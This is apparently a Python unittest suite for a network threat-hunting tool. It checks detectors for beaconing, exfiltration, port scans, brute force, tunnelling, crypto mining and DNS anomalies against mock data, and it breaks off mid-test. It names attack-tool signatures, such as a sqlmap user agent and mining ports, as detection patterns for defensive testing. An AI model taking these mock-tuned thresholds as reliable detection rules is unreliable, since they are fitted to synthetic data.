"""
Test suite for 221B threat hunting strategies.

Tests all strategies with mock data to ensure they work correctly
without requiring external IONIC database connections.
"""

import unittest
import pandas as pd
import numpy as np
from datetime import datetime, timedelta
from strategies import (
    BeaconStrategy,
    EntropyStrategy,
    ExfilStrategy,
    PortScanStrategy,
    BruteForceStrategy,
    TunnelingStrategy,
    LateralMovementStrategy,
    DataHoardingStrategy,
    TimeAnomalyStrategy,
    GeoAnomalyStrategy,
    UserAgentAnomalyStrategy,
    CryptoMiningStrategy,
    DNSAnomalyStrategy,
    AccountTakeoverStrategy,
    DataStagingStrategy,
    FilelessMalwareStrategy,
    APIAbuseStrategy,
    ShadowITStrategy,
    PrivilegeEscalationStrategy,
    WebshellDetectionStrategy,
    CredentialDumpingStrategy,
    RansomwareIndicatorStrategy
)


class TestBeaconStrategy(unittest.TestCase):
    """Test the Beacon Hunter strategy."""
    
    def setUp(self):
        """Set up test data."""
        self.strategy = BeaconStrategy()
    
    def test_beacon_detection_with_regular_intervals(self):
        """Test that regular beaconing is detected."""
        # Create mock data with regular 60-second intervals
        base_time = datetime.now()
        data = []
        for i in range(20):
            data.append({
                'timestamp': base_time + timedelta(seconds=60 * i),
                'source_ip': '192.168.1.100',
                'dest_ip': '10.0.0.1'
            })
        
        df = pd.DataFrame(data)
        col_map = {
            'timestamp': 'timestamp',
            'source_ip': 'source_ip',
            'dest_ip': 'dest_ip'
        }
        
        result = self.strategy.analyze(df, col_map)
        
        # Should detect beacon
        self.assertFalse(result.empty)
        self.assertGreaterEqual(result.iloc[0]['beacon_score'], 50)
        self.assertEqual(result.iloc[0]['connection_count'], 20)
    
    def test_no_beacon_with_irregular_intervals(self):
        """Test that irregular traffic is not flagged as beaconing."""
        # Set seed for reproducible tests
        np.random.seed(42)
        
        # Create mock data with random intervals
        base_time = datetime.now()
        data = []
        for i in range(20):
            # Random intervals between 10 and 300 seconds
            random_offset = np.random.randint(10, 300) * i
            data.append({
                'timestamp': base_time + timedelta(seconds=random_offset),
                'source_ip': '192.168.1.100',
                'dest_ip': '10.0.0.1'
            })
        
        df = pd.DataFrame(data)
        col_map = {
            'timestamp': 'timestamp',
            'source_ip': 'source_ip',
            'dest_ip': 'dest_ip'
        }
        
        result = self.strategy.analyze(df, col_map)
        
        # Should not detect beacon or have low score (≤50)
        if not result.empty:
            self.assertLessEqual(result.iloc[0]['beacon_score'], 50)
    
    def test_column_explanations(self):
        """Test that column explanations are provided."""
        explanations = self.strategy.get_column_explanations()
        self.assertIn('beacon_score', explanations)
        self.assertIn('source_ip', explanations)


class TestEntropyStrategy(unittest.TestCase):
    """Test the Entropy Analyzer strategy."""
    
    def setUp(self):
        """Set up test data."""
        self.strategy = EntropyStrategy()
    
    def test_high_entropy_detection(self):
        """Test that high-entropy strings are detected."""
        # Set seed for reproducible tests
        np.random.seed(42)
        
        # Create mock data with high-entropy strings (random-looking domains)
        data = []
        for i in range(10):
            # Generate random string (high entropy)
            random_str = ''.join(np.random.choice(list('abcdefghijklmnopqrstuvwxyz0123456789'), 50))
            data.append({'query': random_str})
        
        df = pd.DataFrame(data)
        col_map = {'target_string': 'query'}
        
        result = self.strategy.analyze(df, col_map)
        
        # Should detect high entropy
        self.assertFalse(result.empty)
        self.assertGreater(result.iloc[0]['entropy_score'], 4.0)
        self.assertGreaterEqual(result.iloc[0]['suspicion_score'], 50)
    
    def test_low_entropy_not_flagged(self):
        """Test that normal strings are not flagged."""
        # Create mock data with normal domains
        data = [
            {'query': 'google.com'},
            {'query': 'facebook.com'},
            {'query': 'amazon.com'}
        ]
        
        df = pd.DataFrame(data)
        col_map = {'target_string': 'query'}
        
        result = self.strategy.analyze(df, col_map)
        
        # Should not detect anything suspicious
        self.assertTrue(result.empty)
    
    def test_column_explanations(self):
        """Test that column explanations are provided."""
        explanations = self.strategy.get_column_explanations()
        self.assertIn('entropy_score', explanations)
        self.assertIn('suspicion_score', explanations)


class TestExfilStrategy(unittest.TestCase):
    """Test the Exfiltration Monitor strategy."""
    
    def setUp(self):
        """Set up test data."""
        self.strategy = ExfilStrategy()
    
    def test_high_upload_ratio_detection(self):
        """Test that high upload ratios are detected."""
        # Create mock data with high upload, low download
        data = [
            {
                'source_ip': '192.168.1.100',
                'bytes_out': 100_000_000,  # 100MB upload
                'bytes_in': 1_000_000      # 1MB download
            }
        ]
        
        df = pd.DataFrame(data)
        col_map = {
            'source_ip': 'source_ip',
            'bytes_out': 'bytes_out',
            'bytes_in': 'bytes_in'
        }
        
        result = self.strategy.analyze(df, col_map)
        
        # Should detect exfiltration
        self.assertFalse(result.empty)
        self.assertGreater(result.iloc[0]['exfil_ratio'], 10)
        self.assertGreaterEqual(result.iloc[0]['exfil_score'], 50)
    
    def test_normal_download_pattern_not_flagged(self):
        """Test that normal download patterns are not flagged."""
        # Create mock data with normal download pattern (more realistic volume)
        data = []
        for i in range(5):  # Multiple connections to simulate normal usage
            data.append({
                'source_ip': '192.168.1.100',
                'bytes_out': 50_000,       # 50KB upload per connection
                'bytes_in': 5_000_000      # 5MB download per connection
            })
        
        df = pd.DataFrame(data)
        col_map = {
            'source_ip': 'source_ip',
            'bytes_out': 'bytes_out',
            'bytes_in': 'bytes_in'
        }
        
        result = self.strategy.analyze(df, col_map)
        
        # Should not detect exfiltration (or score should be low)
        if not result.empty:
            # Ratio should be low (download > upload)
            self.assertLess(result.iloc[0]['exfil_ratio'], 1.0)
    
    def test_column_explanations(self):
        """Test that column explanations are provided."""
        explanations = self.strategy.get_column_explanations()
        self.assertIn('exfil_score', explanations)
        self.assertIn('exfil_ratio', explanations)


class TestPortScanStrategy(unittest.TestCase):
    """Test the Port Scan Detector strategy."""
    
    def setUp(self):
        """Set up test data."""
        self.strategy = PortScanStrategy()
    
    def test_port_scan_detection(self):
        """Test that port scanning is detected."""
        # Create mock data with many port accesses
        data = []
        for port in range(1, 101):  # Scan ports 1-100
            data.append({
                'source_ip': '192.168.1.100',
                'dest_ip': '10.0.0.1',
                'dest_port': port
            })
        
        df = pd.DataFrame(data)
        col_map = {
            'source_ip': 'source_ip',
            'dest_ip': 'dest_ip',
            'dest_port': 'dest_port'
        }
        
        result = self.strategy.analyze(df, col_map)
        
        # Should detect port scan
        self.assertFalse(result.empty)
        self.assertEqual(result.iloc[0]['unique_ports'], 100)
        self.assertGreaterEqual(result.iloc[0]['scan_score'], 50)
    
    def test_normal_traffic_not_flagged(self):
        """Test that normal traffic is not flagged as scanning."""
        # Create mock data with few ports
        data = [
            {'source_ip': '192.168.1.100', 'dest_ip': '10.0.0.1', 'dest_port': 80},
            {'source_ip': '192.168.1.100', 'dest_ip': '10.0.0.1', 'dest_port': 443},
        ]
        
        df = pd.DataFrame(data)
        col_map = {
            'source_ip': 'source_ip',
            'dest_ip': 'dest_ip',
            'dest_port': 'dest_port'
        }
        
        result = self.strategy.analyze(df, col_map)
        
        # Should not detect port scan
        self.assertTrue(result.empty)
    
    def test_column_explanations(self):
        """Test that column explanations are provided."""
        explanations = self.strategy.get_column_explanations()
        self.assertIn('scan_score', explanations)
        self.assertIn('unique_ports', explanations)


class TestBruteForceStrategy(unittest.TestCase):
    """Test the Brute Force Detector strategy."""
    
    def setUp(self):
        """Set up test data."""
        self.strategy = BruteForceStrategy()
    
    def test_brute_force_detection(self):
        """Test that brute force attacks are detected."""
        # Create mock data with many failed login attempts
        data = []
        for i in range(100):
            data.append({
                'source_ip': '192.168.1.100',
                'dest_ip': '10.0.0.1',
                'status': 'failed' if i < 95 else 'success'
            })
        
        df = pd.DataFrame(data)
        col_map = {
            'source_ip': 'source_ip',
            'dest_ip': 'dest_ip',
            'status': 'status'
        }
        
        result = self.strategy.analyze(df, col_map)
        
        # Should detect brute force
        self.assertFalse(result.empty)
        self.assertEqual(result.iloc[0]['total_attempts'], 100)
        self.assertEqual(result.iloc[0]['failed_attempts'], 95)
        self.assertGreaterEqual(result.iloc[0]['brute_force_score'], 50)
    
    def test_normal_auth_not_flagged(self):
        """Test that normal authentication is not flagged."""
        # Create mock data with mostly successful logins
        data = [
            {'source_ip': '192.168.1.100', 'dest_ip': '10.0.0.1', 'status': 'success'},
            {'source_ip': '192.168.1.100', 'dest_ip': '10.0.0.1', 'status': 'success'},
            {'source_ip': '192.168.1.100', 'dest_ip': '10.0.0.1', 'status': 'success'},
        ]
        
        df = pd.DataFrame(data)
        col_map = {
            'source_ip': 'source_ip',
            'dest_ip': 'dest_ip',
            'status': 'status'
        }
        
        result = self.strategy.analyze(df, col_map)
        
        # Should not detect brute force
        self.assertTrue(result.empty)
    
    def test_column_explanations(self):
        """Test that column explanations are provided."""
        explanations = self.strategy.get_column_explanations()
        self.assertIn('brute_force_score', explanations)
        self.assertIn('failure_rate', explanations)


class TestTunnelingStrategy(unittest.TestCase):
    """Test the Protocol Tunneling Detector strategy."""
    
    def setUp(self):
        """Set up test data."""
        self.strategy = TunnelingStrategy()
    
    def test_tunneling_detection(self):
        """Test that protocol tunneling is detected."""
        # Create mock data with high traffic on truly non-standard port
        data = []
        for i in range(100):
            data.append({
                'source_ip': '192.168.1.100',
                'dest_ip': '10.0.0.1',
                'dest_port': 12345,  # Non-standard port (not in common lists)
                'bytes_total': 1_000_000  # 1MB per connection
            })
        
        df = pd.DataFrame(data)
        col_map = {
            'source_ip': 'source_ip',
            'dest_ip': 'dest_ip',
            'dest_port': 'dest_port',
            'bytes_total': 'bytes_total'
        }
        
        result = self.strategy.analyze(df, col_map)
        
        # Should detect tunneling
        self.assertFalse(result.empty)
        self.assertEqual(result.iloc[0]['dest_port'], 12345)
        self.assertGreaterEqual(result.iloc[0]['tunnel_score'], 50)
    
    def test_standard_port_not_flagged(self):
        """Test that standard ports are less likely to be flagged."""
        # Create mock data on standard port
        data = [
            {'source_ip': '192.168.1.100', 'dest_ip': '10.0.0.1', 
             'dest_port': 443, 'bytes_total': 100_000}
        ]
        
        df = pd.DataFrame(data)
        col_map = {
            'source_ip': 'source_ip',
            'dest_ip': 'dest_ip',
            'dest_port': 'dest_port',
            'bytes_total': 'bytes_total'
        }
        
        result = self.strategy.analyze(df, col_map)
        
        # Should not detect tunneling (standard port, low volume)
        self.assertTrue(result.empty)
    
    def test_column_explanations(self):
        """Test that column explanations are provided."""
        explanations = self.strategy.get_column_explanations()
        self.assertIn('tunnel_score', explanations)
        self.assertIn('dest_port', explanations)


class TestLateralMovementStrategy(unittest.TestCase):
    """Test the Lateral Movement Detector strategy."""
    
    def setUp(self):
        """Set up test data."""
        self.strategy = LateralMovementStrategy()
    
    def test_lateral_movement_detection(self):
        """Test that lateral movement is detected."""
        # Create mock data with one source contacting many targets
        base_time = datetime.now()
        data = []
        for i in range(20):
            data.append({
                'timestamp': base_time + timedelta(minutes=i * 5),
                'source_ip': '192.168.1.100',
                'dest_ip': f'10.0.0.{i + 1}'  # Different target each time
            })
        
        df = pd.DataFrame(data)
        col_map = {
            'timestamp': 'timestamp',
            'source_ip': 'source_ip',
            'dest_ip': 'dest_ip'
        }
        
        result = self.strategy.analyze(df, col_map)
        
        # Should detect lateral movement
        self.assertFalse(result.empty)
        self.assertEqual(result.iloc[0]['unique_targets'], 20)
        self.assertGreaterEqual(result.iloc[0]['lateral_score'], 50)
    
    def test_normal_traffic_not_flagged(self):
        """Test that normal traffic is not flagged."""
        # Create mock data with few unique targets
        data = [
            {'timestamp': datetime.now(), 'source_ip': '192.168.1.100', 'dest_ip': '10.0.0.1'},
            {'timestamp': datetime.now(), 'source_ip': '192.168.1.100', 'dest_ip': '10.0.0.1'},
            {'timestamp': datetime.now(), 'source_ip': '192.168.1.100', 'dest_ip': '10.0.0.2'},
        ]
        
        df = pd.DataFrame(data)
        col_map = {
            'timestamp': 'timestamp',
            'source_ip': 'source_ip',
            'dest_ip': 'dest_ip'
        }
        
        result = self.strategy.analyze(df, col_map)
        
        # Should not detect lateral movement
        self.assertTrue(result.empty)
    
    def test_column_explanations(self):
        """Test that column explanations are provided."""
        explanations = self.strategy.get_column_explanations()
        self.assertIn('lateral_score', explanations)
        self.assertIn('unique_targets', explanations)


class TestDataHoardingStrategy(unittest.TestCase):
    """Test the Data Hoarding Detector strategy."""
    
    def setUp(self):
        """Set up test data."""
        self.strategy = DataHoardingStrategy()
    
    def test_data_hoarding_detection(self):
        """Test that data hoarding is detected."""
        # Create mock data with large downloads from many sources
        data = []
        for i in range(30):
            data.append({
                'source_ip': '192.168.1.100',
                'dest_ip': f'10.0.0.{i + 1}',
                'bytes_in': 50_000_000  # 50MB per connection
            })
        
        df = pd.DataFrame(data)
        col_map = {
            'source_ip': 'source_ip',
            'dest_ip': 'dest_ip',
            'bytes_in': 'bytes_in'
        }
        
        result = self.strategy.analyze(df, col_map)
        
        # Should detect hoarding
        self.assertFalse(result.empty)
        self.assertEqual(result.iloc[0]['unique_data_sources'], 30)
        self.assertGreaterEqual(result.iloc[0]['hoarding_score'], 50)
    
    def test_normal_downloads_not_flagged(self):
        """Test that normal downloads are not flagged."""
        # Create mock data with small downloads
        data = [
            {'source_ip': '192.168.1.100', 'dest_ip': '10.0.0.1', 'bytes_in': 500_000},
            {'source_ip': '192.168.1.100', 'dest_ip': '10.0.0.2', 'bytes_in': 600_000},
        ]
        
        df = pd.DataFrame(data)
        col_map = {
            'source_ip': 'source_ip',
            'dest_ip': 'dest_ip',
            'bytes_in': 'bytes_in'
        }
        
        result = self.strategy.analyze(df, col_map)
        
        # Should not detect hoarding
        self.assertTrue(result.empty)
    
    def test_column_explanations(self):
        """Test that column explanations are provided."""
        explanations = self.strategy.get_column_explanations()
        self.assertIn('hoarding_score', explanations)
        self.assertIn('unique_data_sources', explanations)


class TestTimeAnomalyStrategy(unittest.TestCase):
    """Test the Time-Based Anomaly Detector strategy."""
    
    def setUp(self):
        """Set up test data."""
        self.strategy = TimeAnomalyStrategy()
    
    def test_off_hours_detection(self):
        """Test that off-hours activity is detected."""
        # Create mock data with activity at 2am (off-hours)
        base_time = datetime.now().replace(hour=2, minute=0, second=0, microsecond=0)
        data = []
        for i in range(50):
            data.append({
                'timestamp': base_time + timedelta(minutes=i),
                'source_ip': '192.168.1.100'
            })
        
        df = pd.DataFrame(data)
        col_map = {
            'timestamp': 'timestamp',
            'source_ip': 'source_ip'
        }
        
        result = self.strategy.analyze(df, col_map)
        
        # Should detect off-hours anomaly
        self.assertFalse(result.empty)
        self.assertGreater(result.iloc[0]['off_hours_percentage'], 50)
        self.assertGreaterEqual(result.iloc[0]['anomaly_score'], 50)
    
    def test_business_hours_not_flagged(self):
        """Test that business hours activity is not flagged."""
        # Create mock data with activity at 10am on Monday (business hours)
        base_time = datetime.now().replace(hour=10, minute=0, second=0, microsecond=0)
        # Adjust to make sure it's a Monday
        while base_time.weekday() != 0:  # 0 = Monday
            base_time += timedelta(days=1)
        
        data = []
        for i in range(20):
            data.append({
                'timestamp': base_time + timedelta(minutes=i),
                'source_ip': '192.168.1.100'
            })
        
        df = pd.DataFrame(data)
        col_map = {
            'timestamp': 'timestamp',
            'source_ip': 'source_ip'
        }
        
        result = self.strategy.analyze(df, col_map)
        
        # Should not detect off-hours anomaly
        self.assertTrue(result.empty)
    
    def test_column_explanations(self):
        """Test that column explanations are provided."""
        explanations = self.strategy.get_column_explanations()
        self.assertIn('anomaly_score', explanations)
        self.assertIn('off_hours_percentage', explanations)


class TestGeoAnomalyStrategy(unittest.TestCase):
    """Test the Geo-Anomaly Detector strategy."""
    
    def setUp(self):
        """Set up test data."""
        self.strategy = GeoAnomalyStrategy()
    
    def test_high_risk_country_detection(self):
        """Test that high-risk countries are detected."""
        # Create mock data with high-risk country
        # CN (high-risk country) provides 40 points + 2 countries provides 10 points = 50 total
        data = []
        for i in range(10):
            data.append({
                'source_ip': '192.168.1.100',
                'country_code': 'CN'  # High-risk country (40 points)
            })
        for i in range(5):
            data.append({
                'source_ip': '192.168.1.100',
                'country_code': 'US'  # Normal country (enables 2-country bonus: 10 points)
            })
        
        df = pd.DataFrame(data)
        col_map = {
            'source_ip': 'source_ip',
            'country_code': 'country_code'
        }
        
        result = self.strategy.analyze(df, col_map)
        
        # Should detect geo anomaly
        self.assertFalse(result.empty)
        self.assertIn('CN', result.iloc[0]['countries'])
        self.assertGreaterEqual(result.iloc[0]['geo_anomaly_score'], 50)
    
    def test_multiple_countries_detection(self):
        """Test that multiple countries are detected."""
        # Create mock data with many countries (5+ countries = 30 points)
        # Adding a high-risk country to reach threshold (30 + 40 = 70)
        data = []
        countries = ['US', 'UK', 'DE', 'FR', 'CN']  # CN is high-risk
        for i, country in enumerate(countries):
            data.append({
                'source_ip': '192.168.1.100',
                'country_code': country
            })
        
        df = pd.DataFrame(data)
        col_map = {
            'source_ip': 'source_ip',
            'country_code': 'country_code'
        }
        
        result = self.strategy.analyze(df, col_map)
        
        # Should detect geo anomaly
        self.assertFalse(result.empty)
        self.assertEqual(result.iloc[0]['unique_countries'], 5)
        self.assertGreaterEqual(result.iloc[0]['geo_anomaly_score'], 50)
    
    def test_normal_country_not_flagged(self):
        """Test that normal single-country access is not flagged."""
        # Create mock data with safe country
        data = [
            {'source_ip': '192.168.1.100', 'country_code': 'US'},
            {'source_ip': '192.168.1.100', 'country_code': 'US'},
        ]
        
        df = pd.DataFrame(data)
        col_map = {
            'source_ip': 'source_ip',
            'country_code': 'country_code'
        }
        
        result = self.strategy.analyze(df, col_map)
        
        # Should not detect geo anomaly
        self.assertTrue(result.empty)
    
    def test_column_explanations(self):
        """Test that column explanations are provided."""
        explanations = self.strategy.get_column_explanations()
        self.assertIn('geo_anomaly_score', explanations)
        self.assertIn('unique_countries', explanations)


class TestUserAgentAnomalyStrategy(unittest.TestCase):
    """Test the User-Agent Anomaly Detector strategy."""
    
    def setUp(self):
        """Set up test data."""
        self.strategy = UserAgentAnomalyStrategy()
    
    def test_attack_tool_detection(self):
        """Test that attack tools are detected."""
        # Create mock data with attack tool user agents
        data = []
        for i in range(20):
            data.append({
                'source_ip': '192.168.1.100',
                'user_agent': 'sqlmap/1.0 (http://sqlmap.org)'
            })
        
        df = pd.DataFrame(data)
        col_map = {
            'source_ip': 'source_ip',
            'user_agent': 'user_agent'
        }
        
        result = self.strategy.analyze(df, col_map)
        
        # Should detect user agent anomaly
        self.assertFalse(result.empty)
        self.assertIn('sqlmap', result.iloc[0]['attack_tools_detected'])
        self.assertGreaterEqual(result.iloc[0]['ua_anomaly_score'], 50)
    
    def test_suspicious_pattern_detection(self):
        """Test that suspicious patterns are detected."""
        # Create mock data with suspicious user agents
        # Suspicious pattern (30 points) + empty agents (20 points) = 50 total
        data = []
        for i in range(10):
            data.append({
                'source_ip': '192.168.1.100',
                'user_agent': 'python-requests/2.28.0'  # Suspicious pattern (30 points)
            })
        for i in range(5):
            data.append({
                'source_ip': '192.168.1.100',
                'user_agent': ''  # Empty user agent (20 points)
            })
        
        df = pd.DataFrame(data)
        col_map = {
            'source_ip': 'source_ip',
            'user_agent': 'user_agent'
        }
        
        result = self.strategy.analyze(df, col_map)
        
        # Should detect user agent anomaly
        self.assertFalse(result.empty)
        self.assertGreaterEqual(result.iloc[0]['ua_anomaly_score'], 50)
    
    def test_normal_user_agent_not_flagged(self):
        """Test that normal user agents are not flagged."""
        # Create mock data with normal browser user agent
        data = [
            {'source_ip': '192.168.1.100', 
             'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'},
            {'source_ip': '192.168.1.100', 
             'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'},
        ]
        
        df = pd.DataFrame(data)
        col_map = {
            'source_ip': 'source_ip',
            'user_agent': 'user_agent'
        }
        
        result = self.strategy.analyze(df, col_map)
        
        # Should not detect anomaly
        self.assertTrue(result.empty)
    
    def test_column_explanations(self):
        """Test that column explanations are provided."""
        explanations = self.strategy.get_column_explanations()
        self.assertIn('ua_anomaly_score', explanations)
        self.assertIn('attack_tools_detected', explanations)


class TestCryptoMiningStrategy(unittest.TestCase):
    """Test the Crypto Mining Detector strategy."""
    
    def setUp(self):
        """Set up test data."""
        self.strategy = CryptoMiningStrategy()
    
    def test_mining_port_detection(self):
        """Test that mining ports are detected."""
        # Create mock data with mining port connections
        data = []
        for i in range(50):
            data.append({
                'source_ip': '192.168.1.100',
                'dest_ip': '10.0.0.1',
                'dest_port': 3333  # Known mining port
            })
        
        df = pd.DataFrame(data)
        col_map = {
            'source_ip': 'source_ip',
            'dest_ip': 'dest_ip',
            'dest_port': 'dest_port'
        }
        
        result = self.strategy.analyze(df, col_map)
        
        # Should detect mining activity
        self.assertFalse(result.empty)
        self.assertIn('3333', result.iloc[0]['mining_ports_used'])
        self.assertGreaterEqual(result.iloc[0]['mining_score'], 50)
    
    def test_persistent_connections_detection(self):
        """Test that persistent connections to few destinations are detected."""
        # Create mock data with many connections to one destination
        data = []
        for i in range(100):
            data.append({
                'source_ip': '192.168.1.100',
                'dest_ip': '10.0.0.1',
                'dest_port': 4444  # Mining port
            })
        
        df = pd.DataFrame(data)
        col_map = {
            'source_ip': 'source_ip',
            'dest_ip': 'dest_ip',
            'dest_port': 'dest_port'
        }
        
        result = self.strategy.analyze(df, col_map)
        
        # Should detect mining activity
        self.assertFalse(result.empty)
        self.assertEqual(result.iloc[0]['unique_destinations'], 1)
        self.assertGreaterEqual(result.iloc[0]['mining_score'], 50)
    
    def test_normal_traffic_not_flagged(self):
        """Test that normal traffic is not flagged."""
        # Create mock data with standard ports and few connections
        data = [
            {'source_ip': '192.168.1.100', 'dest_ip': '10.0.0.1', 'dest_port': 80},
            {'source_ip': '192.168.1.100', 'dest_ip': '10.0.0.2', 'dest_port': 443},
        ]
        
        df = pd.DataFrame(data)
        col_map = {
            'source_ip': 'source_ip',
            'dest_ip': 'dest_ip',
            'dest_port': 'dest_port'
        }
        
        result = self.strategy.analyze(df, col_map)
        
        # Should not detect mining (insufficient connections)
        self.assertTrue(result.empty)
    
    def test_column_explanations(self):
        """Test that column explanations are provided."""
        explanations = self.strategy.get_column_explanations()
        self.assertIn('mining_score', explanations)
        self.assertIn('mining_ports_used', explanations)


class TestStrategyRequirements(unittest.TestCase):
    """Test that all strategies meet basic requirements."""
    
    # All strategies to test - defined once to avoid duplication
    ALL_STRATEGIES = [
        BeaconStrategy,
        EntropyStrategy,
        ExfilStrategy,
        PortScanStrategy,
        BruteForceStrategy,
        TunnelingStrategy,
        LateralMovementStrategy,
        DataHoardingStrategy,
        TimeAnomalyStrategy,
        GeoAnomalyStrategy,
        UserAgentAnomalyStrategy,
        CryptoMiningStrategy,
        DNSAnomalyStrategy,
        AccountTakeoverStrategy,
        DataStagingStrategy,
        FilelessMalwareStrategy,
        APIAbuseStrategy,
        ShadowITStrategy,
        PrivilegeEscalationStrategy,
        WebshellDetectionStrategy,
        CredentialDumpingStrategy,
        RansomwareIndicatorStrategy
    ]
    
    def test_all_strategies_have_names(self):
        """Test that all strategies have names."""
        for StrategyClass in self.ALL_STRATEGIES:
            strategy = StrategyClass()
            self.assertIsNotNone(strategy.name)
            self.assertGreater(len(strategy.name), 0)
    
    def test_all_strategies_have_required_inputs(self):
        """Test that all strategies define required inputs."""
        for StrategyClass in self.ALL_STRATEGIES:
            strategy = StrategyClass()
            self.assertIsNotNone(strategy.required_inputs)
            self.assertGreater(len(strategy.required_inputs), 0)
    
    def test_all_strategies_have_explanations(self):
        """Test that all strategies provide column explanations."""
        for StrategyClass in self.ALL_STRATEGIES:
            strategy = StrategyClass()
            explanations = strategy.get_column_explanations()
            self.assertIsNotNone(explanations)
            self.assertGreater(len(explanations), 0)


class TestDNSAnomalyStrategy(unittest.TestCase):
    """Test the DNS Anomaly Detector strategy."""
    
    def setUp(self):
        """Set up test data."""
        self.strategy = DNSAnomalyStrategy()
    
    def test_suspicious_dns_patterns(self):
        """Test that suspicious DNS patterns are detected."""
        # Create mock data with suspicious patterns
        base_time = datetime.now()
        data = []
        
        # Generate high-volume queries with suspicious TLDs and high NXDOMAIN rate
        for i in range(100):
            data.append({
                'timestamp': base_time + timedelta(seconds=i),
                'source_ip': '192.168.1.100',
                'query_name': f'malware{i}.suspicious.tk',
                'response_code': '3'  # NXDOMAIN
            })
        
        df = pd.DataFrame(data)
        col_map = {
            'timestamp': 'timestamp',
            'source_ip': 'source_ip',
            'query_name': 'query_name',
            'response_code': 'response_code'
        }
        
        result = self.strategy.analyze(df, col_map)
        
        # Should detect anomalous DNS behavior
        self.assertFalse(result.empty)
        self.assertGreaterEqual(result.iloc[0]['dns_anomaly_score'], 50)
        self.assertGreater(result.iloc[0]['suspicious_tld_count'], 0)
        self.assertGreater(result.iloc[0]['nxdomain_ratio'], 0.5)
    
    def test_normal_dns_not_flagged(self):
        """Test that normal DNS queries are not flagged."""
        # Create mock data with normal DNS patterns
        base_time = datetime.now()
        data = []
        
        # Generate low-volume queries to legitimate domains
        for i in range(10):
            data.append({
                'timestamp': base_time + timedelta(seconds=i * 60),
                'source_ip': '192.168.1.100',
                'query_name': f'www.google.com',
                'response_code': '0'  # Success
            })
        
        df = pd.DataFrame(data)
        col_map = {
            'timestamp': 'timestamp',
            'source_ip': 'source_ip',
            'query_name': 'query_name',
            'response_code': 'response_code'
        }
        
        result = self.strategy.analyze(df, col_map)
        
        # Should not detect anomalies or have low score
        if not result.empty:
            self.assertLess(result.iloc[0]['dns_anomaly_score'], 50)
    
    def test_column_explanations(self):
        """Test that column explanations are provided."""
        explanations = self.strategy.get_column_explanations()
        self.assertIn('dns_anomaly_score', explanations)
        self.assertIn('source_ip', explanations)


class TestAccountTakeoverStrategy(unittest.TestCase):
    """Test the Account Takeover Detector strategy."""
    
    def setUp(self):
        """Set up test data."""
        self.strategy = AccountTakeoverStrategy()
    
    def test_takeover_pattern_detection(self):
        """Test that account takeover patterns are detected."""
        # Create mock data with suspicious patterns
        base_time = datetime.now()
        data = []
        
        # Simulate multiple IPs, failed attempts, and rapid switching
        ips = ['10.0.0.1', '10.0.0.2', '10.0.0.3', '10.0.0.4', '10.0.0.5']
        for i in range(50):
            data.append({
                'timestamp': base_time + timedelta(seconds=i * 10),
                'username': 'admin',
                'source_ip': ips[i % len(ips)],
                'action': 'login',
                'status': 'failed' if i < 30 else 'success'
            })
        
        df = pd.DataFrame(data)
        col_map = {
            'timestamp': 'timestamp',
            'username': 'username',
            'source_ip': 'source_ip',
            'action': 'action',
            'status': 'status'
        }
        
        result = self.strategy.analyze(df, col_map)
        
        # Should detect takeover pattern
        self.assertFalse(result.empty)
        self.assertGreaterEqual(result.iloc[0]['takeover_score'], 50)
        self.assertGreaterEqual(result.iloc[0]['unique_ips'], 3)
        self.assertGreater(result.iloc[0]['failed_attempts'], 0)
    
    def test_normal_activity_not_flagged(self):
        """Test that normal authentication activity is not flagged."""
        # Create mock data with normal patterns
        base_time = datetime.now()
        data = []
        
        # Simulate normal single-IP successful logins
        for i in range(10):
            data.append({
                'timestamp': base_time + timedelta(hours=i),
                'username': 'user1',
                'source_ip': '192.168.1.100',
                'action': 'login',
                'status': 'success'
            })
        
        df = pd.DataFrame(data)
        col_map = {
            'timestamp': 'timestamp',
            'username': 'username',
            'source_ip': 'source_ip',
            'action': 'action',
            'status': 'status'
        }
        
        result = self.strategy.analyze(df, col_map)
        
        # Should not detect anomalies
        if not result.empty:
            self.assertLess(result.iloc[0]['takeover_score'], 50)
    
    def test_column_explanations(self):
        """Test that column explanations are provided."""
        explanations = self.strategy.get_column_explanations()
        self.assertIn('takeover_score', explanations)
        self.assertIn('username', explanations)


class TestDataStagingStrategy(unittest.TestCase):
    """Test the Data Staging Detector strategy."""
    
    def setUp(self):
        """Set up test data."""
        self.strategy = DataStagingStrategy()
    
    def test_staging_activity_detection(self):
        """Test that data staging activity is detected."""
        # Create mock data with staging patterns
        base_time = datetime.now()
        data = []
        
        # Simulate compression operations on sensitive files
        for i in range(100):
            data.append({
                'timestamp': base_time + timedelta(seconds=i),
                'source_ip': '192.168.1.100',
                'file_path': f'/finance/documents/report{i}.zip' if i % 2 == 0 else f'/hr/confidential/data{i}.rar',
                'operation': 'write',
                'file_size': 10 * 1024 * 1024  # 10 MB
            })
        
        df = pd.DataFrame(data)
        col_map = {
            'timestamp': 'timestamp',
            'source_ip': 'source_ip',
            'file_path': 'file_path',
            'operation': 'operation',
            'file_size': 'file_size'
        }
        
        result = self.strategy.analyze(df, col_map)
        
        # Should detect staging activity
        self.assertFalse(result.empty)
        self.assertGreaterEqual(result.iloc[0]['staging_score'], 50)
        self.assertGreater(result.iloc[0]['staging_file_ops'], 0)
        self.assertGreater(result.iloc[0]['sensitive_access'], 0)
    
    def test_normal_file_ops_not_flagged(self):
        """Test that normal file operations are not flagged."""
        # Create mock data with normal patterns
        base_time = datetime.now()
        data = []
        
        # Simulate low-volume normal file reads
        for i in range(5):
            data.append({
                'timestamp': base_time + timedelta(minutes=i * 10),
                'source_ip': '192.168.1.100',
                'file_path': f'/home/user/document{i}.txt',
                'operation': 'read',
                'file_size': 1024  # 1 KB
            })
        
        df = pd.DataFrame(data)
        col_map = {
            'timestamp': 'timestamp',
            'source_ip': 'source_ip',
            'file_path': 'file_path',
            'operation': 'operation',
            'file_size': 'file_size'
        }
        
        result = self.strategy.analyze(df, col_map)
        
        # Should not detect anomalies (below minimum threshold)
        self.assertTrue(result.empty)
    
    def test_column_explanations(self):
        """Test that column explanations are provided."""
        explanations = self.strategy.get_column_explanations()
        self.assertIn('staging_score', explanations)
        self.assertIn('source_ip', explanations)


class TestFilelessMalwareStrategy(unittest.TestCase):
    """Test the Fileless Malware strategy."""
    
    def setUp(self):
        """Set up test data."""
        self.strategy = FilelessMalwareStrategy()
    
    def test_fileless_attack_detection(self):
        """Test that fileless attack patterns are detected."""
        # Create mock data with suspicious PowerShell activity
        data = []
        for i in range(15):
            data.append({
